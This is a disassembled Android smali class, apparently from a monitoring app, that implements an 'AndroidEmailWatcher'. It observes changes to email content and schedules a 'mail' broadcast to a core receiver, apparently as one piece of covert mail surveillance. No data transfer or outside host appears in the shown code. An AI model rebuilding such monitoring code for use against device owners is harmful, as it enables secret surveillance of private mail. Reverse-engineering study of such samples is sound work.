.class final Lcom/network/android/monitor/observer/m;
.super Landroid/database/ContentObserver;


# instance fields
.field final synthetic a:Lcom/network/e/a/a;

.field final synthetic b:Lcom/network/android/monitor/observer/l;


# direct methods
.method constructor <init>(Lcom/network/android/monitor/observer/l;Lcom/network/e/a/a;)V
    .locals 1

    iput-object p1, p0, Lcom/network/android/monitor/observer/m;->b:Lcom/network/android/monitor/observer/l;

    iput-object p2, p0, Lcom/network/android/monitor/observer/m;->a:Lcom/network/e/a/a;

    const/4 v0, 0x0

    invoke-direct {p0, v0}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    return-void
.end method


# virtual methods
.method public final onChange(Z)V
    .locals 7

    :try_start_0
    const-string v0, "mail AndroidEmailWatcher onChange"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/network/android/monitor/observer/m;->b:Lcom/network/android/monitor/observer/l;

    invoke-static {v0}, Lcom/network/android/monitor/observer/l;->a(Lcom/network/android/monitor/observer/l;)J

    move-result-wide v0

    const-wide/16 v2, 0x0

    cmp-long v0, v0, v2

    if-eqz v0, :cond_0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iget-object v2, p0, Lcom/network/android/monitor/observer/m;->b:Lcom/network/android/monitor/observer/l;

    invoke-static {v2}, Lcom/network/android/monitor/observer/l;->a(Lcom/network/android/monitor/observer/l;)J

    move-result-wide v2

    sub-long/2addr v0, v2

    const-wide/16 v2, 0x7530

    cmp-long v0, v0, v2

    if-lez v0, :cond_1

    :cond_0
    sget-boolean v0, Lcom/network/b/b;->v:Z

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/network/android/monitor/observer/m;->b:Lcom/network/android/monitor/observer/l;

    invoke-static {v0}, Lcom/network/android/monitor/observer/l;->b(Lcom/network/android/monitor/observer/l;)Z

    iget-object v0, p0, Lcom/network/android/monitor/observer/m;->b:Lcom/network/android/monitor/observer/l;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    invoke-static {v0, v1, v2}, Lcom/network/android/monitor/observer/l;->a(Lcom/network/android/monitor/observer/l;J)J

    iget-object v0, p0, Lcom/network/android/monitor/observer/m;->a:Lcom/network/e/a/a;

    invoke-virtual {v0}, Lcom/network/e/a/a;->a()Landroid/content/Context;

    move-result-object v1

    const-string v0, "alarm"

    invoke-virtual {v1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/network/media/CoreReceiver;

    invoke-direct {v2, v1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v3, "mail"

    invoke-virtual {v2, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const/4 v3, 0x0

    const/4 v4, 0x0

    invoke-static {v1, v3, v2, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    const-wide/16 v5, 0x2710

    add-long/2addr v3, v5

    invoke-virtual {v0, v2, v3, v4, v1}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    const-string v0, "mail AndroidEmailWatcher Event"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_1
    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "getMail- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method
